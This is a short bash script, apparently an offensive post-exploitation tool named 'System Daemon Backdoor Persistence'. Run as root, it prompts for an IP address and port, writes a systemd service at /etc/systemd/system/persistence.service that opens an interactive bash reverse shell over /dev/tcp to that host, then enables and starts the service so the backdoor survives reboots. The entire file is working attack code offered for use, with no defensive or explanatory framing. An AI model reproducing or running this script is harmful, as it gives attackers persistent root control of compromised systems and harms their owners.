#!/usr/bin/bash

RED_="\x1b[31m"
GREEN_="\x1b[32m"
FIM_="\x1b[0m"

(( "$EUID" != 0 ))&& echo -e "${RED_}-${FIM_} Program must be executed as ${GREEN_}root${FIM_} (su - OR sudo ${0##*/})\n"

echo -e "${GREEN_}System Daemon Backdoor Persistence${FIM_}\n"

read -rp "$(echo -e $RED_"IPv4 : "$FIM_)" IPv4_
read -rp "$(echo -e $RED_"Port  : "$FIM_)" PORT_

echo -e "${GREEN_}Added persistence to:${FIM_} /etc/systemd/system/persistence.service\n"
echo -e '[Unit]\nDescription=System Daemon Persistence\n\n[Service]\nUser=root\nGroup=root\nWorkingDirectory=/root\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/'$IPv4_/$PORT_' 0>&1"' >> /etc/systemd/system/persistence.service

echo -e "${GREEN_}Starting the process...${FIM_}\n"
systemctl enable persistence.service && systemctl start persistence

echo -e "${GREEN_}Completed\nExiting...${FIM_}"
